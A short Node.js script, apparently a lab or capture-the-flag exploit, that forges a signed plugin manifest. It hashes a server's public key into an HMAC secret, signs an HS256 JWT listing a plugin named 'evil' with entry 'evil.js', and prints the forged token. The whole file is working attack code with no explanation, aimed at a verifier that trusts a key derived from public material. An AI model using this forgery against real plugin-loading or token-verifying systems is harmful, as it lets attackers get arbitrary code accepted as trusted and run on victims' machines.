const fs = require("fs");
const crypto = require("crypto");
const jwt = require("jsonwebtoken");

const pem = fs.readFileSync("public.pem", "utf8");
const key = crypto.createHash("sha256").update(pem).digest();

const manifest = {
  version: 1,
  plugins: [{ name: "evil", entry: "evil.js" }],
};

const payload = {
  manifest,
  exp: Math.floor(Date.now() / 1000) + 3600,
};

const token = jwt.sign(payload, key, { algorithm: "HS256" });
console.log(token);
